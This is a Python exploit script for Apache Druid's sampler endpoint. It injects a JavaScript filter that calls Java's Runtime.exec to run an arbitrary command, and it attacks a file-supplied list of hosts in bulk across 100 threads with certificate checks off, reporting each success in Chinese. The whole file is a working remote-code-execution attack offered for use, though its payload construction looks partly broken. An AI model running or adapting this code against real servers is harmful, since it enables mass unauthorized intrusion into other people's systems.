#!/usr/bin/python3

import requests
import sys
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def exp(host):
    host = host.strip()
    if host[:4] != "http":
        host = "http://" + host
    url = host + "/druid/indexer/v1/sampler?for=filter"
    data = {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/opt/","filter":""}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript","function":"function(value){return java.lang.Runtime.getRuntime().exec("+ cmd + ")}","dimension":"added","":{"enabled":"true"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
    data4 = {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"/opt/","filter":""}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript",
                                                                                                                                                                                                                                                                                                                                                      "function": "function(value){return java.lang.Runtime.getRuntime().exec(" + cmd +")}",
                                                                                                                                                                                                                                                                                                                                                      "dimension": "added",
                                                                                                                                                                                                                                                                                                                                                      "": {
                                                                                                                                                                                                                                                                                                                                                          "enabled": "true"
                                                                                                                                                                                                                                                                                                                                                      }
                                                                                                                                                                                                                                                                                                                                                      }}}},
             "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}


    try:
        r = requests.post(url=url, timeout=5, verify=False, data=data)
        r1 =requests.post(url=url, timeout=5, verify=False, data=data4)
        if r.status_code == 200:
            print("成功"+url)
    except:
        pass

if __name__ == '__main__':
    cmd = '命令'
    with ThreadPoolExecutor(max_workers=100) as pool:
        with open(sys.argv[1], 'r') as f:
            task = [pool.submit(exp, url) for url in f.readlines()]
